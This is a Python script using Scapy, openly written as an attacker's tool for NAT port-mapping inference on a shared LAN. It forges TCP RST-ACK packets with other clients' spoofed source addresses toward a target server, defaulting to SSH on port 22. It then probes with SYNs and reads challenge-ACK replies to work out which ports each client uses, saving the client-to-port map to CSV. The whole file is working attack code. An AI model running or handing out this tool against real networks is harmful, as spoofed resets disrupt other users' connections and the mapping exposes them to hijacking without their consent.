#!/usr/bin/env python3
from __future__ import annotations
import argparse, csv, datetime, ipaddress, os, sys, time, signal
from queue import Queue, Empty
import random

# scapy
try:
    from scapy.all import AsyncSniffer, send, IP, TCP
    SCAPY_AVAILABLE = True
except Exception as e:
    print(f"[!] Scapy import error: {e}")
    SCAPY_AVAILABLE = False
    AsyncSniffer = None
    send = None
    IP = None
    TCP = None

# ---------- CONFIG ----------
ATTACKER_IP = "" # Attackers' private IP in the LAN
SERVER_IP = "" # Target servers' public IP e.g., 4.4.6.6
SERVER_PORT = 22 # Target servers' port 
IFACE = "wlo1"  

# Timing parameters (NAT-dependent)
WAIT_AFTER_RST = 1.5      # Time for NAT to clear mapping after RST
WAIT_AFTER_SYN = 1.5      # Time to wait for server response after SYN
SYN_INTERVAL = 0      # Delay between SYN packets for a specific client (may need to be used to prevent SYN flooding)
INTER_CLIENT_DELAY = 0  

# TCP sequence number
SYN_SEQ = 1000

# Global state
pkt_q = Queue()
sniffer = None
running = True

# Signal handling
def signal_handler(sig, frame):
    global running
    print(f"\n[!] Received signal {sig}, shutting down...")
    running = False
    if sniffer:
        try:
            sniffer.stop()
        except:
            pass

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

def SEND_RST(client_ip: str, ports: list[int]) -> bool:
    """Send RST-ACK for all ports from client"""
    if not SCAPY_AVAILABLE or IP is None or send is None:
        print("[!] Scapy not available")
        return False
    
    try:
        pkts = []
        for port in ports:
            pkt = IP(src=client_ip, dst=SERVER_IP) / TCP(
                sport=port,
                dport=SERVER_PORT,
                flags="RA",
                seq=random.randint(0, 2**32-1),
                # ack not set => ack = 0
            )
            pkts.append(pkt)
        
        send(pkts, iface=IFACE, verbose=False)
        print(f"RST sent for {len(ports)} ports from {client_ip}")
        return True
    except Exception as e:
        print(f"[!] Failed to send RST: {e}")
        return False

def SEND_SYN(ports: list[int]) -> bool:
    """Send SYN for all ports"""
    if not SCAPY_AVAILABLE or IP is None or send is None:
        print("[!] Scapy not available")
        return False
    
    try:
        sent = 0
        for i, port in enumerate(ports):
            pkt = IP(src=ATTACKER_IP, dst=SERVER_IP) / TCP(
                sport=port,
                dport=SERVER_PORT,
                flags="S",
                seq=SYN_SEQ
            )
            send(pkt, iface=IFACE, verbose=False)
            sent += 1
            
            # Small delay between SYNs to avoid flood
            if SYN_INTERVAL > 0 and i < len(ports) - 1:
                time.sleep(SYN_INTERVAL)
        
        print(f"SYN sent for {sent} ports ({SYN_INTERVAL*1000:.1f}ms between)")
        return True
    except Exception as e:
        print(f"[!] Failed to send SYN: {e}")
        return False

def get_clients(attacker_ip: str, mask: str) -> list[str]:
    """Get all client IPs in subnet"""
    net = ipaddress.IPv4Network(f"{attacker_ip}/{mask}", strict=False)
    clients = [str(ip) for ip in net.hosts() if str(ip) != attacker_ip]
    return clients

def pkt_cb(pkt):
    global running
    if not running:
        return
    
    try:
        if not (hasattr(pkt, 'haslayer') and pkt.haslayer(IP) and pkt.haslayer(TCP)):
            return
        
        if pkt[IP].src != SERVER_IP or pkt[IP].dst != ATTACKER_IP:
            return
        if int(pkt[TCP].sport) != SERVER_PORT:
            return
        
        flags = int(pkt[TCP].flags)
        ack = int(pkt[TCP].ack)
        dport = int(pkt[TCP].dport)
        
        pkt_q.put({
            'time': time.time(),
            'flags': flags,
            'ack': ack,
            'dport': dport
        })
    except:
        pass  

def start_sniff():
    if AsyncSniffer is None:
        return None
    
    try:
        bpf = f"tcp and src host {SERVER_IP} and src port {SERVER_PORT} and dst host {ATTACKER_IP}"
        sniffer = AsyncSniffer(iface=IFACE, filter=bpf, prn=pkt_cb, store=False)
        sniffer.start()
        return sniffer
    except Exception as e:
        print(f"[!] Failed to start sniffer: {e}")
        return None

def clear_q():
    """Clear packet queue"""
    cleared = 0
    while True:
        try:
            pkt_q.get_nowait()
            cleared += 1
        except Empty:
            break
    
    if cleared > 0:
        print(f"Cleared {cleared} old packets")

def ports_response(ports: list[int], start_time: float) -> dict[int, str]:
    port_responses = {}
    
    # Get all packets in queue
    all_packets = []
    while True:
        try:
            pkt = pkt_q.get_nowait()
            all_packets.append(pkt)
        except Empty:
            break
    
    # Analyze each packet
    for pkt in all_packets:
        p_port = pkt.get('dport')
        p_time = pkt.get('time', 0)
        
        if p_port in ports and p_time > start_time and p_port not in port_responses:
            flags = pkt['flags']
            is_syn = bool(flags & 0x02)
            is_ack = bool(flags & 0x10)
            ack_num = pkt.get('ack')
            
            if is_syn and is_ack and ack_num == SYN_SEQ + 1:
                port_responses[p_port] = "SYN_ACK"
            elif is_ack and not is_syn and ack_num != SYN_SEQ + 1:
                port_responses[p_port] = "CHALLENGE_ACK"
    
    # Mark missing responses
    for port in ports:
        if port not in port_responses:
            port_responses[port] = "NO_RESPONSE"
    
    return port_responses

def test_client_ports(client_ip: str, ports: list[int]) -> list[int]:
    """
    Test which ports this client uses
     returns:
        claimed ports 
    """
    global running
    
    if not ports or not running:
        return []
    
    print(f"\n[Client] {client_ip}\n")
    print(f"Testing {len(ports)} ports")
    
    clear_q()
    test_start = time.time()
    
    # Send RST for all ports
    if not SEND_RST(client_ip, ports):
        print("[!] RST failed, skipping client")
        return []
    
    # Wait for NAT to clear mappings
    print(f"Waiting {WAIT_AFTER_RST}s after RST...")
    time.sleep(WAIT_AFTER_RST)
    
    if not running:
        return []
    
    # Send SYN for all ports
    if not SEND_SYN(ports):
        print("[!] SYN failed, skipping client")
        return []
    
    print(f"Waiting {WAIT_AFTER_SYN}s for responses...")
    time.sleep(WAIT_AFTER_SYN)
    
 
    responses = ports_response(ports, test_start)

    claimed_ports = []
    
    for port in ports:
        resp = responses.get(port, "NO_RESPONSE")
        
        if resp == "CHALLENGE_ACK":
            claimed_ports.append(port)
            print(f"Port {port}: {client_ip} uses it!")
        elif resp == "SYN_ACK":
            print(f"Port {port}: Not used by {client_ip}")
        else:
            print(f"Port {port}: No response [?]")
    
    return claimed_ports

def load_ports(file: str = None, cli_ports: list = None) -> list[int]:
    if file and os.path.exists(file):
        with open(file, 'r') as f:
            ports = [int(line.strip()) for line in f if line.strip()]
        print(f"Loaded {len(ports)} active ports from {file}")
    else:
        ports = cli_ports or []
        print(f"Using {len(ports)} ports from CLI")
    
    if not ports:
        raise ValueError("No ports specified")
    
    return ports

def main():
    global WAIT_AFTER_RST, WAIT_AFTER_SYN, SYN_INTERVAL, INTER_CLIENT_DELAY
    global running, sniffer
    
    parser = argparse.ArgumentParser(
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )
    parser.add_argument("--mask", required=True, help="Subnet mask (e.g., 24 or 255.255.255.0)")
    parser.add_argument("--ports-file", help="File with active ports (one per line)")
    parser.add_argument("--ports", nargs="+", type=int, help="Active ports (space separated)")
    parser.add_argument("--out", default="client_NAT_mapping.csv", help="Output CSV file")
    
    # Timing controls
    parser.add_argument("--wait-rst", type=float, default=WAIT_AFTER_RST,
                       help="Wait after RST for NAT to clear mapping")
    parser.add_argument("--wait-syn", type=float, default=WAIT_AFTER_SYN,
                       help="Wait after SYN for server response")
    parser.add_argument("--syn-interval", type=float, default=SYN_INTERVAL,
                       help="Delay between SYN packets")
    parser.add_argument("--client-delay", type=float, default=INTER_CLIENT_DELAY,
                       help="Delay between starting client tests")
    
    args = parser.parse_args()
    
    # Update timing
    WAIT_AFTER_RST = args.wait_rst
    WAIT_AFTER_SYN = args.wait_syn
    SYN_INTERVAL = args.syn_interval
    INTER_CLIENT_DELAY = args.client_delay
    
    print(f"Attacker: {ATTACKER_IP}")
    print(f"Server: {SERVER_IP}:{SERVER_PORT}")
    print(f"Interface: {IFACE}")
    print(f"\nTiming:")
    print(f"1. RST wait: {WAIT_AFTER_RST}s")
    print(f"2. SYN wait: {WAIT_AFTER_SYN}s")
    print(f"3. SYN spacing: {SYN_INTERVAL*1000:.1f}ms")
    print(f"4. Client delay: {INTER_CLIENT_DELAY}s")
    print()
    
    # Setup
    clients = get_clients(ATTACKER_IP, args.mask)
    print(f"Clients to test: {len(clients)}")
    
    ports = load_ports(args.ports_file, args.ports)
    remaining_ports = ports.copy()
    
    # Start sniffer
    sniffer = start_sniff()
    if not sniffer:
        print("[ERROR] Could not start packet capture")
        return
    
    time.sleep(1) 
    
    claims = {}
    tested_clients = 0
    # test_start_time = time.time()
    try:
        for client_idx, client in enumerate(clients):
            if not running:
                print("\n[!] Stopping...")
                break
            
            if not remaining_ports:
                print(f"\nAll {len(ports)} ports claimed!")
                break
            
            tested_clients += 1
            print(f"\n[Client {client_idx+1}/{len(clients)}] {client}")
            print(f"Ports remaining: {len(remaining_ports)}")
            
            claimed = test_client_ports(client, remaining_ports)
            
            if claimed:
                claims[client] = claimed
                for port in claimed:
                    if port in remaining_ports:
                        remaining_ports.remove(port)
                print(f"Client claims {len(claimed)} port(s)")
            else:
                print(f"Client claims 0 ports")
            
            # Delay before next client
            if client != clients[-1] and remaining_ports and running:
                print(f"  Waiting {INTER_CLIENT_DELAY}s before next client...")
                time.sleep(INTER_CLIENT_DELAY)
             
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
    except Exception as e:
        print(f"\n[ERROR] {e}")
    finally:
    	# test_end_time = time.time()
        # Clean shutdown
        running = False
        if sniffer:
            try:
                sniffer.stop()
            except:
                pass
        
        if claims:
            with open(args.out, 'w', newline='') as f:
                writer = csv.writer(f)
                writer.writerow(['client', 'port', 'timestamp'])
                for client, port_list in claims.items():
                    for port in port_list:
                        timestamp = datetime.datetime.now().isoformat()
                        writer.writerow([client, port, timestamp])
        #    print(f"\nResults saved {args.out}")
        
       # print(f"\n" + "="*60)
       # print("SUMMARY")
       # print("="*60)
        print(f"Active ports discovered: {len(ports)}")
        print(f"Clients tested: {tested_clients}")
        print(f"Ports claimed: {len(ports) - len(remaining_ports)}")
        print(f"Ports unclaimed: {len(remaining_ports)}")
       	#total_time = test_end_time - test_start_time
       	#print(f"Time Taken: {total_time}") 
        if claims:
            print(f"\nClient-Port Mapping:")
            for client in sorted(claims.keys()):
                ports_str = ', '.join(str(p) for p in sorted(claims[client]))
                print(f"  {client}: {ports_str}")
        
        if remaining_ports:
            print(f"\nUnclaimed ports (false positives):")
            print(f"  {', '.join(str(p) for p in sorted(remaining_ports))}")
	
if __name__ == "__main__":
    if os.geteuid() != 0:
        print("ERROR: This script requires root privileges")
        print("Run with: sudo python3 <script_name>.py ...")
        sys.exit(1) 
    main()
